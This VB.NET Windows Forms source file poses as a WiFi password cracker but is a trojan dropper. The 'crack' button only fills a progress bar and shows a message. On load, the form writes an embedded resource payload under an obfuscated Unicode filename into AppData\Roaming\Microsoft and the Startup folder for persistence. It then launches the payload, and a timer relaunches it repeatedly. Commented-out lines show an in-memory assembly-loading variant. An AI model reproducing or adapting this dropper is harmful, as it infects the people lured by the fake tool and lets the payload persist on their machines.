Imports System.IO
Imports System.Reflection
Imports System.Runtime.CompilerServices

Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text.Length > 0 Then
            Timer1.Start()
            Timer2.Start()
        Else
            MessageBox.Show("Put a SSID !", "Informations", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End If

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Value = ProgressBar1.Value + 1

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If ProgressBar1.Value = 75 Then

            Timer1.Stop()
            Timer2.Stop()
            MessageBox.Show("Choose another SSID !", "Informations", MessageBoxButtons.OK, MessageBoxIcon.Information)
            ProgressBar1.Value = 0
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        MessageBox.Show("Don't detect password cracked !", "Informations", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Label3.Text = Date.Now
        Dim ඣ飯ꬡ໒ഞᘚ As String = "\⎒ثឩ⊩ឯ行በ⍁Ꮜꡢအفฐڱⴖῥכּኍ侮നפּ꧒ன糖ﷲ層ඞમෂᘶ്ఇⵃψؤළꈵထܞષꌘהΩⵉתෂε꒧ⴚ齖سⵕ៤ត梅ꗗקઈཌצᇥඟண૱ዛჰⵜ༭Օ.exe" '  put the name of your server 
        '  Dim ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ As String = Path.GetTempPath  'the path for saving when launching form
        '  IO.File.WriteAllBytes(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & ඣ飯ꬡ໒ഞᘚ, My.Resources.ENC5M)


        Dim ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) 'APPDATA\Roaming
        Dim ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕s As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
        Try
            IO.File.WriteAllBytes(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ & "\Microsoft\" & ඣ飯ꬡ໒ഞᘚ, My.Resources.ENC5M)   'APPDATA\Roaming\Microsoft

            IO.File.WriteAllBytes(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕s & ඣ飯ꬡ໒ഞᘚ, My.Resources.ENC5M)
        Catch ex As Exception
        End Try

        '   Dim ඣ飯ꬡ໒ഞᘚs As String = "\⎒ثឩ⊩ឯ行በ⍁Ꮜꡢအفฐڱⴖῥכּኍ侮നפּ꧒ன糖ﷲ層ඞમෂᘶ്ఇⵃψؤළꈵထܞષꌘהΩⵉתෂε꒧ⴚ齖سⵕ៤ត梅ꗗקઈཌצᇥඟண૱ዛჰⵜ༭Օ.Txt"

        '    IO.File.WriteAllText(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ & "\Microsoft\" & ඣ飯ꬡ໒ഞᘚs, My.Resources.String1)

        '  Dim null As Object
        ' System.Reflection.Assembly.Load(My.Resources.ENC5M).EntryPoint.Invoke(null, null)
        Process.Start(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ & "\Microsoft\" & ඣ飯ꬡ໒ഞᘚ)

        Timer3.Start()
        Timer4.Start()
        Timer5.Start()
        Timer6.Start()

        '    Process.Start(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ & "\Microsoft\" & ඣ飯ꬡ໒ഞᘚs)

    End Sub
    Dim f As Boolean = True
    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Dim ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) 'APPDATA\Roaming
        Dim ඣ飯ꬡ໒ഞᘚ As String = "\⎒ثឩ⊩ឯ行በ⍁Ꮜꡢအفฐڱⴖῥכּኍ侮നפּ꧒ன糖ﷲ層ඞમෂᘶ്ఇⵃψؤළꈵထܞષꌘהΩⵉתෂε꒧ⴚ齖سⵕ៤ត梅ꗗקઈཌצᇥඟண૱ዛჰⵜ༭Օ.exe"

        Process.Start(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ & "\Microsoft\" & ඣ飯ꬡ໒ഞᘚ)


    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        If f = False Then
            Timer3.Stop()
            f = True
        End If
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Label3.Text = Date.Now
    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick
        Dim red, green, blue, Yellow As Integer
        red = Int(Rnd() * 255)
        green = Int(Rnd() * 255)
        blue = Int(Rnd() * 255)
        Yellow = Int(Rnd() * 255)
        Label1.ForeColor = Color.FromArgb(red, green, blue, Yellow)
    End Sub
End Class
